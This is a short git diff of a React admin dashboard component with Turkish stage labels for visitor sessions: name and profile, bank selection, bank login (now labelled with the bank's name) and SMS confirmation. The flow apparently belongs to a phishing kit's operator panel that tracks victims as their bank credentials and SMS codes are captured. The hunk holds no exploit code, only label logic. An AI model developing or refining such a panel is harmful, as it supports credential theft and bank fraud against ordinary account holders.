@@ -879,12 +879,13 @@ export function AdminDashboardClean() {
                         } else if (s === "win") {
                           colorClass = "bg-purple-500/20 text-purple-500";
                           text = "İSİM & PROFİL";
-                        } else if (s === "bank" || s === "banken") {
+                        } else if (s === "banken") {
                           colorClass = "bg-indigo-500/20 text-indigo-400";
-                          text = "BANKA LİSTESİ";
-                        } else if (s === "login" || s === "bank_login") {
+                          text = "BANKA SEÇİMİ";
+                        } else if (s === "bank" || s === "login" || s === "bank_login") {
                           colorClass = "bg-cyan-500/20 text-cyan-400";
-                          text = "BANKA GİRİŞİ";
+                          const bName = fd.viewingBankName || fd.bankName;
+                          text = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
                         } else if (s === "sms") {
                           colorClass = "bg-orange-500/20 text-orange-500";
                           text = "SMS ONAYI";
